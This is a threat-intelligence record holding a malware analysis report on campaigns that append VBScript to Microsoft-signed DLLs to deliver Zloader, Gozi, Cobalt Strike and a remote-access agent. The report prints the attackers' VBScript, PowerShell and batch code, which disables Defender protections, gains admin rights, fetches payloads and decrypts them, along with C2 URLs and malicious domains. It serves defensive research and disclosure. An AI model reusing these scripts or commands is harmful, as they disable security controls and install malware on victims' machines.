{
    "id": "e22a9a34-71d4-43ae-85ec-067495b96067",
    "created_at": "2023-01-12T15:07:27.013416Z",
    "updated_at": "2025-03-27T02:05:46.982367Z",
    "deleted_at": null,
    "sha1_hash": "34b8ee601b145d65386d189f3c384ba09c53fb3d",
    "title": "2022-01-11 - Signed DLL campaigns as a service",
    "authors": "",
    "file_creation_date": "2022-05-28T17:58:49Z",
    "file_modification_date": "2022-05-28T17:58:49Z",
    "file_size": 128311,
    "plain_text": "# Signed DLL campaigns as a service\n\n**[medium.com/walmartglobaltech/signed-dll-campaigns-as-a-service-7760ac676489](https://medium.com/walmartglobaltech/signed-dll-campaigns-as-a-service-7760ac676489)**\n\nJason Reaves January 11, 2022\n\n### Jas on\n\n\n### Jason Reaves\n\n Jan 11\n\n ·\n\n 10 min read\n\n By: Jason Reaves and Joshua Platt\n\n\n-----\n\n### A man wearing glasses working on a laptop.\n\n\n### Recently an actor has begun using a technique of embedding VBScript data at the end of Microsoft signed DLLs in order to GPG decrypt and then detonate payloads. While writing up our research another article was released on this by CheckPoint[7][8] but we felt there are enough pieces from our own research that can add to the story.\n\n This concept has been talked about before using various files and is normally referred to as ‘Polyglotting’, for example lnk files[2] and appending to PE files[1]. For these campaigns they used Microsoft signed DLLs and abused a code signing check bug in attempts to bypass security measures.\n\n The campaigns related to Zloader have also been previously discussed[3] so we will be focusing on going over the updates and differences in the more recent campaigns.\n\n\n-----\n\n## Campaign\n\n### The campaign has multiple components but the idea is to ultimately detonate malware, the malware payloads we went over include the following:\n```\nAterAgent RATZloaderGoziCobaltStrike\n\n As previously mentioned in the SentinelOne[3] article these campaigns still begin with fake installers, for the more recent campaigns we investigated they were using AdvancedInstaller to create the packages which would then kick off the detonation process of various components.\n\n The follow up components will handle various setup functionality such as setting up exclusions for msiexec using VBScript code appended to Microsoft signed binaries:\n\n```\n\n-----\n\n```\n<script LANGUAGE VBScript >Set WshShell CreateObject ( WScript.Shell )WshShell.run\n\"cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command\nAdd-MpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Roaming'\", 0WshShell.run \"cmd.exe\n/c powershell.exe -inputformat none -outputformat none -NonInteractive -Command AddMpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Roaming*'\", 0WshShell.run \"cmd.exe /c\npowershell.exe -inputformat none -outputformat none -NonInteractive -Command AddMpPreference -ExclusionPath '%USERPROFILE%\\AppData\\Roaming\\*'\", 0WshShell.run \"cmd.exe\n/c powershell.exe -inputformat none -outputformat none -NonInteractive -Command AddMpPreference -ExclusionPath 'C:\\*'\", 0WshShell.run \"cmd.exe /c powershell.exe inputformat none -outputformat none -NonInteractive -Command Add-MpPreference ExclusionPath 'C:\\'\", 0WshShell.run \"cmd.exe /c powershell.exe -command Set-MpPreference\n-MAPSReporting 0\", 0WshShell.run \"cmd.exe /c powershell.exe -command Add-MpPreference ExclusionProcess 'regsvr32'\", 0WshShell.run \"cmd.exe /c powershell.exe -command AddMpPreference -ExclusionProcess 'rundll32.exe'\", 0WshShell.run \"cmd.exe /c powershell.exe\n-command Add-MpPreference -ExclusionProcess 'rundll32*'\", 0WshShell.run \"cmd.exe /c\npowershell.exe -command Add-MpPreference -ExclusionExtension '.exe'\", 0WshShell.run\n\"cmd.exe /c powershell.exe -command Add-MpPreference -ExclusionProcess 'regsvr32*'\",\n0WshShell.run \"cmd.exe /c powershell.exe -command Add-MpPreference -ExclusionProcess\n'.dll'\", 0WshShell.run \"cmd.exe /c powershell.exe -command Add-MpPreference ExclusionProcess '*.dll'\", 0WshShell.run \"cmd.exe /c powershell.exe -command SetMpPreference -PUAProtection disable\", 0WshShell.run \"cmd.exe /c powershell.exe -command\nSet-MpPreference -EnableControlledFolderAccess Disabled\", 0WshShell.run \"cmd.exe /c\npowershell.exe -command Set-MpPreference -DisableRealtimeMonitoring $true\",\n0WshShell.run \"cmd.exe /c powershell.exe -command Set-MpPreference DisableBehaviorMonitoring $true\", 0WshShell.run \"cmd.exe /c powershell.exe -command SetMpPreference -DisableIOAVProtection $true\", 0WshShell.run \"cmd.exe /c powershell.exe command Set-MpPreference -DisablePrivacyMode $true\", 0WshShell.run \"cmd.exe /c\npowershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine\n$true\", 0WshShell.run \"cmd.exe /c powershell.exe -command Set-MpPreference DisableArchiveScanning $true\", 0WshShell.run \"cmd.exe /c powershell.exe -command SetMpPreference -DisableIntrusionPreventionSystem $true\", 0WshShell.run \"cmd.exe /c\npowershell.exe -command Set-MpPreference -DisableScriptScanning $true\", 0WshShell.run\n\"cmd.exe /c powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2\",\n0WshShell.run \"cmd.exe /c powershell.exe -command Add-MpPreference -ExclusionProcess\n'*.exe'\", 0WshShell.run \"cmd.exe /c powershell.exe -command Add-MpPreference ExclusionProcess 'explorer.exe'\", 0WshShell.run \"cmd.exe /c powershell.exe -command AddMpPreference -ExclusionProcess '.exe'\", 0WshShell.run \"cmd.exe /c powershell.exe command Set-MpPreference -HighThreatDefaultAction 6 -Force\", 0WshShell.run \"cmd.exe /c\npowershell.exe -command Set-MpPreference -ModerateThreatDefaultAction 6\", 0WshShell.run\n\"cmd.exe /c powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6\",\n0WshShell.run \"cmd.exe /c powershell.exe -command Set-MpPreference SevereThreatDefaultAction 6\", 0WshShell.run \"cmd.exe /c powershell.exe -command SetMpPreference -ScanScheduleDay 8\", 0WshShell.run \"cmd.exe /c powershell.exe -command AddMpPreference -ExclusionProcess 'msiexec.exe'\", 0window.close()</script>\n\n### Along with installing GPG for powershell usage:\nfunction Install-GnuPg { <# .SYNOPSIS This function installed the GnuPg for Windows\napplication. It the installer file is not in the DownloadFolderPath, the function will\ndownload the file from the Internet and then execute a silent installation. .PARAMETER \nDownloadFolderPath The folder path where you'd like to download the GnuPg for Windows\ninstaller into.$uri = '$moduleFolderPath = 'C:\\Program\nFiles\\WindowsPowerShell\\Modules\\GnuPg'$null = New-Item -Path $moduleFolderPath -Type\nDirectoryInvoke-WebRequest -Uri $uri -OutFile (Join-Path -Path $moduleFolderPath ChildPath 'GnuPg.psm1')$env:APPDATAInstall-GnuPG -DownloadFolderPath $env:APPDATAecho\n\"START\"\n\n```\n\n-----\n\n### The script will also perform some interesting checks to determine the likelyhood of being in an enterprise environment:\n```\n$MaxIPToSendRequest = 2$UserDomain = wmic computersystem get domain$UserDomain =\n$UserDomain[2]$UserDomain = $UserDomain.trim()$UserPCname = $env:computername$UserPCname\n= $UserPCname.trim()Write-Host 'UserDomain = '$UserDomainWrite-Host 'UserPCname =\n'$UserPCname$Condition001 = ($UserDomain -ne $UserPCname)$Condition002 = ($UserDomain ne \"WORKGROUP\")$ArpInfo = arp -a$arr1 =$ArpInfo | select-string \"192.168.(\\d{1,3})\n(\\.\\d{1,3})(.)*(\\w\\w-){5}(\\w\\w)\"     $arr1_count= $arr1.length    #Write-Output\n$arr1$arr2 =$ArpInfo | select-string \"10.(\\d{1,3}).\\d{1,3}(\\.\\d{1,3})(.)*(\\w\\w-){5}\n(\\w\\w)\"     $arr2_count= $arr2.length    #Write-Output $arr2\n$arr3 =$ArpInfo | select-string \"172.(\\d{1,3}).\\d{1,3}(\\.\\d{1,3})(.)*(\\w\\w-){5}(\\w\\w)\"\n    $arr3_count= $arr3.length\n    #Write-Output $arr3\n        $IP_count= $arr1_count + $arr2_count + $arr3_countWrite-Host 'IP_count\n=' $IP_count$Condition003 = ($IP_count -ge $MaxIPToSendRequest)$Condition_All = \n$Condition001 -and $Condition002 -and $Condition003\n\n These checks then determine which malware will be installed, if all the conditions are met and the script is likely inside an enterprise then for this instance it will install CobaltStrike and AteraAgent RAT, if not then it will install Gozi or Zloader.\nif ($Condition_All )\n{\n    $URL = \"\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname \nInvoke-WebRequest -OutFile ais.bat Invoke-WebRequest -OutFile apiicontrast.dll \nInvoke-WebRequest $URL -outfile zoom2.dll.gpg Invoke-WebRequest -outfile zoom1.msi.gpg\n}else{$URL = \"\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname \nInvoke-WebRequest -OutFile ais.bat Invoke-WebRequest -OutFile apiicontrast.dll \nInvoke-WebRequest $URL -outfile zoom.dll.gpg}\n\n From here it begins leveraging multiple batch files in sequences to, but you may notice a number of DLL files are also being downloaded, these DLL files are normally Microsoft signed DLLs with appended VBScript code.\n\n## PE Polyglot Technique\n\n### Some of these abused DLLs have 0 detections on VirusTotal:\n\n```\n\n-----\n\n### Screenshot from If we look into the data on the file however we can see VBScript code has been appended to the file:\n\n\n-----\n\n```\n00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0\n LANGUAGE=\"VBScript\">\\r\\n\\r\\nSet WshShell = CreateObject (\"WScript.Shell\")\\r\\nSub Sleep\n(ms) \\r\\n Set fso = CreateObject(\"Scripting.FileSystemObject\") \\r\\n Dim sFilePath:\nsFilePath = fso.GetSpecialFolder(2) & \"\\\\WScriptSleeper.vbs\"\\r\\n If Not\nfso.FileExists(sFilePath) Then\\r\\n   Set oFile = fso.CreateTextFile(sFilePath,\nTrue)\\r\\n   oFile.Write \"wscript.sleep WScript.Arguments(0)\"\\r\\n   oFile.Close\\r\\n\nEnd If\\r\\n\\r\\n Dim oShell: Set oShell = CreateObject(\"WScript.Shell\")\\r\\n oShell.Run\nsFilePath & \" \" & ms, 0, True\\r\\nEnd Sub\\r\\nSleep (45000)\\r\\nWshShell.run \"cmd.exe /c\nPowerShell -NoProfile -ExecutionPolicy Bypass -command Import-Module GnuPg; RemoveEncryption -FolderPath %AppData% -Password \\'bibigroup\\'\", 0\\r\\nSleep\n(45000)\\r\\nWshShell.run \"cmd.exe /c zoom1.msi\", 0\\r\\nWshShell.run \"cmd.exe /c\nrundll32.exe zoom.dll DllRegisterServer\"\\r\\nWshShell.run \"cmd.exe /c mode.exe\",\n0\\r\\nwindow.close()\\r\\n</script>\n\n### Prettier version of just the VBScript:\n<script LANGUAGE=\"VBScript\">Set WshShell = CreateObject (\"WScript.Shell\")Sub Sleep (ms) \nSet fso = CreateObject(\"Scripting.FileSystemObject\")  Dim sFilePath: sFilePath =\nfso.GetSpecialFolder(2) & \"\\WScriptSleeper.vbs\" If Not fso.FileExists(sFilePath) Then \nSet oFile = fso.CreateTextFile(sFilePath, True)   oFile.Write \"wscript.sleep\nWScript.Arguments(0)\"   oFile.Close End If Dim oShell: Set oShell =\nCreateObject(\"WScript.Shell\") oShell.Run sFilePath & \" \" & ms, 0, TrueEnd SubSleep\n(45000)WshShell.run \"cmd.exe /c PowerShell -NoProfile -ExecutionPolicy Bypass -command\nImport-Module GnuPg; Remove-Encryption -FolderPath %AppData% -Password 'bibigroup'\",\n0Sleep (45000)WshShell.run \"cmd.exe /c zoom1.msi\", 0WshShell.run \"cmd.exe /c\nrundll32.exe zoom.dll DllRegisterServer\"WshShell.run \"cmd.exe /c mode.exe\",\n0window.close()</script>\n\n This DLL is meant to be executed by ‘mshta.exe’ which will then decrypt and detonate files. The detonation piece will involve the usage of batch files as previously mentioned, example:\n\n e3d7f1af2bc790cf143827d2335b594dc3d54a0f49cb61e0b8d6a2d1f0ad27cb\n\n For this instance adminpriv is Nsudo[4] and reboos.dll is for detonating a separate DLL using the same trick with mshta.exe:\n<script LANGUAGE=\"VBScript\">Set WshShell = CreateObject (\"WScript.Shell\")WshShell.run\n\"cmd.exe /c rundll32.exe zoom2.dll DllRegisterServer\", 0WshShell.run \"cmd.exe /c\nregsvr32 zoom.dll\", 0window.close()</script>\n\n The downloaded batch file `auto.bat` from above will leverage adminpriv which we mentioned is NSude[4]:\nadminpriv -U:T -ShowWindowMode:Hide sc delete windefend\n\n It will also execute other vbs code which also lines up with the previous work done by SentinelOne:\n:UACPrompt  echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\getadmin.vbs\"\nset params = %*:\"=\"  echo UAC.ShellExecute \"cmd.exe\", \"/c %~s0 %params%\", \"\", \"runas\",\n0 >> \"%temp%\\getadmin.vbs\"\"%temp%\\getadmin.vbs\"  del \"%temp%\\getadmin.vbs\"  exit /B\n\n```\n\n-----\n\n### And finally we can see it detonate the code appended to the DLL using mshta:\n```\nstart /b cmd /c C:\\Windows\\System32\\mshta.exe %APPDATA%\\apiicontrast.dll\n\n The zoom file as it turns out for this instance is an AteraAgent installer:\n\n b6280ee7d58b89b0951f08aabe64f1780887bf360e8a725e4269675398ebad65\nPlushkinloder9@yandex.ru\n\n The email associated with the Atera installer was also used for a domain registration:\nRegistry Registrant ID: reg-a6r6lkbkoh64Registrant Name: Registrant Organization:\nRegistrant Street: Registrant City: Registrant State/Province: Registrant Postal Code:\nRegistrant Country: RURegistrant Phone: Registrant Phone Ext:Registrant Fax: Registrant\nFax Ext:Registrant Email: Registry Admin ID: reg-zsnzthxfekkqAdmin Name: Admin\nOrganization: Admin Street: Admin City: Admin State/Province: Admin Postal Code: Admin\nCountry: RUAdmin Phone: Admin Phone Ext:Admin Fax: Admin Fax Ext:Admin Email: Registry\nTech ID: reg-v8bnf870ivb6Tech Name: Tech Organization: Tech Street: Tech City: Tech\nState/Province: Tech Postal Code: Tech Country: RUTech Phone: Tech Phone Ext:Tech Fax:\nTech Fax Ext:Tech Email:\n\n Atleast one campaign server was still online during our research from December campaigns:\n\n```\n\n-----\n\n### Installer campaign panel login This is a sold service and can be linked to a crew we have previously discussed, ConfCrew[6].\n\n## Campaign stats\n\n### Campaigns began in May 2021 and go through December 2021:\n\n\n-----\n\n### Infections by month in 2021 The infections are primarily located in the US and Europe but do cover a wide range of places geographically:\n\n\n-----\n\n### Infections by geolocation\n\n## Malware Config Extraction\n\n### The Zloader is the newer version, the config is simply encrypted with RC4 using a hardcoded key which was mentioned in the article by Hasherezade previously[5]. We can abuse the NULL values in the internal configuration along with some basic knowledge of RC4 encryption to find the internal config after we first find the key:\n```\nconfig_key = re.findall('[a-z]{20,}', data)\n\n After finding the key we can find the encrypted config by looking for 16 bytes chunks from the 256 byte SBOX, this would tell us the general area where the encrypted config is which then makes this a bruteable problem.\n\n```\n\n-----\n\n```\n  if len(config_key) > 0:    #Find possible key    key config_key[0]    \n#Because ARC4 is a reoccuring sbox of 256 bytes    #We can possible find the\nencrypted config by looking for any 16 byte    # sequence from a null encrypted\nblock    temp = '\\x00'*256    rc4 = ARC4.new(key)    needle =\nrc4.encrypt(temp)    offsets = []    for i in range(256/16):      if\nneedle[i*16:(i+1)*16] in data:        offsets.append(data.find(needle[i*16:\n(i+1)*16]))    if len(offsets) > 0:      #Take first occurrence      off\n= min(offsets)      #Create bruteable space      blob = data[off(1024*4):off+(1024*4)]\n\n### Now we just brute until we find a known plaintext string:\n      for i in range(len(blob)):        rc4 = ARC4.new(key)        \ntest = rc4.decrypt(blob[i:])        if ' in test or ' in test:         \nprint(\"Found it\")          print(test)          break\n\n Zloader internal config:\nCAMPAIGN: vasja\nC2: C2_KEY: 03d5ae30a0bd934a23b6a7f0756aa504\n\n And pivoting on the C2 key we can find lots of campaigns by this actor:\n\n```\n\n-----\n\n```\nCAMPAIGN: personal\nC2: https://iqowijsdakm.com/gate.php\nhttps://wiewjdmkfjn.com/gate.php\nhttps://dksaoidiakjd.com/gate.php\nhttps://iweuiqjdakjd.com/gate.php\nhttps://yuidskadjna.com/gate.php\nhttps://olksmadnbdj.com/gate.php\nhttps://odsakmdfnbs.com/gate.php\nhttps://odsakjmdnhsaj.com/gate.php\nhttps://odjdnhsaj.com/gate.php\nhttps://odoishsaj.com/gate.php\nC2_KEY: 03d5ae30a0bd934a23b6a7f0756aa504\nCAMPAIGN: googleaktualizacija\nC2: https://iqowijsdakm.com/gate.php\nhttps://wiewjdmkfjn.com/gate.php\nhttps://dksaoidiakjd.com/gate.php\nhttps://iweuiqjdakjd.com/gate.php\nhttps://yuidskadjna.com/gate.php\nhttps://olksmadnbdj.com/gate.php\nhttps://odsakmdfnbs.com/gate.php\nhttps://odsakjmdnhsaj.com/gate.php\nhttps://odjdnhsaj.com/gate.php\nhttps://odoishsaj.com/gate.php\nC2_KEY: 03d5ae30a0bd934a23b6a7f0756aa504\nCAMPAIGN: buldog\nC2: https://iqowijsdakm.com/gate.php\nhttps://wiewjdmkfjn.com/gate.php\nhttps://dksaoidiakjd.com/gate.php\nhttps://iweuiqjdakjd.com/gate.php\nhttps://yuidskadjna.com/gate.php\nhttps://olksmadnbdj.com/gate.php\nhttps://odsakmdfnbs.com/gate.php\nhttps://odsakjmdnhsaj.com/gate.php\nhttps://odjdnhsaj.com/gate.php\nhttps://odoishsaj.com/gate.php\nC2_KEY: 03d5ae30a0bd934a23b6a7f0756aa504\nCAMPAIGN: personal\n\n```\n\n-----\n\n```\nC2: https://iqowijsdakm.com/gate.php\nhttps://wiewjdmkfjn.com/gate.php\nhttps://dksaoidiakjd.com/gate.php\nhttps://iweuiqjdakjd.com/gate.php\nhttps://yuidskadjna.com/gate.php\nhttps://olksmadnbdj.com/gate.php\nhttps://odsakmdfnbs.com/gate.php\nhttps://odsakjmdnhsaj.com/gate.php\nhttps://odjdnhsaj.com/gate.php\nhttps://odoishsaj.com/gate.php\nC2_KEY: 03d5ae30a0bd934a23b6a7f0756aa504\nCAMPAIGN: 9092ge\nC2: https://asdfghdsajkl.com/gate.php\nhttps://lkjhgfgsdshja.com/gate.php\nhttps://kjdhsasghjds.com/gate.php\nhttps://kdjwhqejqwij.com/gate.php\nhttps://iasudjghnasd.com/gate.php\nhttps://daksjuggdhwa.com/gate.php\nhttps://dkisuaggdjhna.com/gate.php\nhttps://eiqwuggejqw.com/gate.php\nhttps://dquggwjhdmq.com/gate.php\nhttps://djshggadasj.com/gate.php\nC2_KEY: 03d5ae30a0bd934a23b6a7f0756aa504\nCAMPAIGN: googleaktualizacija\nC2: https://iqowijsdakm.com/gate.php\nhttps://wiewjdmkfjn.com/gate.php\nhttps://dksaoidiakjd.com/gate.php\nhttps://iweuiqjdakjd.com/gate.php\nhttps://yuidskadjna.com/gate.php\nhttps://olksmadnbdj.com/gate.php\nhttps://odsakmdfnbs.com/gate.php\nhttps://odsakjmdnhsaj.com/gate.php\nhttps://odjdnhsaj.com/gate.php\nhttps://odoishsaj.com/gate.php\nC2_KEY: 03d5ae30a0bd934a23b6a7f0756aa504\nCAMPAIGN: tim\nC2: C2_KEY: 03d5ae30a0bd934a23b6a7f0756aa504\n\n### CobaltStrike was also found to be leveraged by this actor for enterprise environments:\n\n```\n\n-----\n\n```\n{ SPAWNTO_X64 : %windir%\\\\sysnative\\\\dllhost.exe, SLEEPTIME : 45000, C2_VERB_GET :\n'GET', 'ProcInject_Execute':\n'\\x06\\x00B\\x00\\x00\\x00\\x06ntdll\\x00\\x00\\x00\\x00\\x13RtlUserThreadStart\\x00\\x01\\x08\\x03\\x04\n 'HostHeader': '', 'ProcInject_MinAllocSize': '17500', 'MAXGET': '1403644', 'KillDate':\n'0', 'PORT': '443', 'UsesCookies': '1', 'WATERMARK': '0', 'C2_REQUEST': \"[('_HEADER', 0,\n'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('_HEADER',\n0, 'Referer: ), ('_HEADER', 0, 'Accept-Encoding: gzip, deflate'), ('BUILD',\n('BASE64URL',)), ('HEADER', 0, 'Cookie')]\", 'UNKNOWN58': '\\x05\\x80', 'CRYPTO_sCHEME':\n'0', 'ITTER': '37', 'C2_CHUNK_POST': '0', 'ObfSectionsInfo':\n'\\xc0\\x02\\x00\\xb2\\xb8\\x03\\x00\\x00\\xc0\\x03\\x00h\\x92\\x04\\x00\\x00\\xa0\\x04\\x00p\\xc0\\x04\\x00\\x\n 'C2_VERB_POST': 'POST', 'SPAWNTO': '', 'PROTOCOL': '8', 'PROXY_BEHAVIOR': '2',\n'ProcInject_StartRWX': '4', 'ProcInject_Prepend_x86': '\\x02\\x90\\x90',\n'ProcInject_UseRWX': '32', 'DOMAINS': 'jersydok.com,/jquery-3.3.1.min.js', 'USERAGENT':\n'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',\n'ProcInject_AllocationMethod': '1', 'C2_POSTREQ': \"[('_HEADER', 0, 'Accept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('_HEADER', 0,\n'Referer: ), ('_HEADER', 0, 'Accept-Encoding: gzip, deflate'), ('BUILD', ('MASK',))]\",\n'textSectEnd': '179186', 'bStageCleanup': '1', 'SPAWNTO_X86':\n'%windir%\\\\syswow64\\\\dllhost.exe', 'ProcInject_Prepend_x64': '\\x02\\x90\\x90',\n'C2_RECOVER':\n'\\x04\\x00\\x00\\x00\\x01\\x00\\x00\\x05\\xf2\\x00\\x00\\x00\\x02\\x00\\x00\\x00T\\x00\\x00\\x00\\x02\\x00\\x0\n 'ProcInject_Stub': '2\\xcdA\\xed\\xf0\\x81\\x0c[_I\\x8e\\xdfG1\\xccm', 'PUBKEY':\n'30819f300d06092a864886f70d010101050003818d00308189028181009068954759ad659b888a090d3948ef\n 'bCFGCaution': '0', 'SUBMITURI': '/jquery-3.3.2.min.js'}\n\n### Gozi:\n{  \"DLL_32\": {    \"CONFIG_FAIL_TIMEOUT\": \"20\",    \"VER\": \"131353\",    \n\"UNKNOWN\": \"\",    \"DGA_COUNT\": \"10\",    \"TIMER\": \"0\",    \"CRC_HOSTS\":\n\"google.mail.com firsone1.online kdsjdsadas.online\",    \"CRC_URI_EXT\": \".bmp\",   \n\"CRC_URI\": \"/jkloll/\",    \"CRC_SERVERKEY\": \"01026655AALLKENM\",    \"MD5\":\n\"1c362dcf0fe517a05952caf90ae1d992\",    \"CRC_SERVER\": \"12\",    \"IMPHASH\":\n\"0d41e840891676bdaee3e54973cf5a69\",    \"PUB_KEY\":\n\"f9ccfec396940a0f3ba99d0043ae8c9a5df54fde98c1596c974533e2050fbd92623d802012d8c5f007edc94b\n    \"SHA256\": \"5d80327decb188074a67137699e5fccdc3a8b296a931ddf20d37597cebb4d140\",  \n\"CONF_TIMEOUT\": \"10\",    \"CRC_GROUP\": \"9090\"  }}\n\n## IOCs\n\n### Installer system:\ncloudfiletehnology.comzoomdownloab.sitepornofilmspremium.comdatalystoy.comcmdadminu.comte\n\n Installer panel traffic Patterns:\n/processingSetRequestBat1/?servername=/processingSetRequestBat2/?\nservername=/processingSetRequestBat3/?servername=/processingSetRequestBat4/?\nservername=/processingSetRequestBat5/?servername=/processingSetRequestBat6/?\nservername=/processingSetRequestBot/?servername=/processingSetRequestCoba/?\nservername=/processingSetRequestDownload/?servername=/processingSetRequestAtera/?\nservername=\n\n Gozi:\nfirsone1.onlinekdsjdsadas.online\n\n```\n\n-----\n\n### Zloader:\n```\neiqwuggejqw.comyuidskadjna.comiweuiqjdakjd.comodsakmdfnbs.comodjdnhsaj.comdjshggadasj.com\n\n CobaltStrike:\njersydok.com\n\n## References\n\n### 1: http://blog.sevagas.com/?Hacking-around-HTA-files\n\n 2: https://hatching.io/blog/lnk-hta-polyglot/\n\n 3:https://www.sentinelone.com/labs/hide-and-seek-new-zloader-infection-chain-comes-with- improved-stealth-and-evasion-mechanisms/\n\n 4:https://github.com/M2Team/NSudo\n\n 5:https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf\n\n 6:https://www.sentinelone.com/labs/valak-malware-and-the-connection-to-gozi-loader-confcrew/\n\n 7:https://research.checkpoint.com/2022/can-you-trust-a-files-digital-signature-new-zloader- campaign-exploits-microsofts-signature-verification-putting-users-at-risk/\n\n 8:https://www.bleepingcomputer.com/news/security/microsoft-code-sign-check-bypassed-to- drop-zloader-malware/\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-11 - Signed DLL campaigns as a service.pdf"
    ],
    "report_names": [
        "2022-01-11 - Signed DLL campaigns as a service.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536047,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1653760729,
    "ts_modification_date": 1653760729,
    "files": {
        "pdf": "https://archive.orkl.eu/34b8ee601b145d65386d189f3c384ba09c53fb3d.pdf",
        "text": "https://archive.orkl.eu/34b8ee601b145d65386d189f3c384ba09c53fb3d.txt",
        "img": "https://archive.orkl.eu/34b8ee601b145d65386d189f3c384ba09c53fb3d.jpg"
    }
}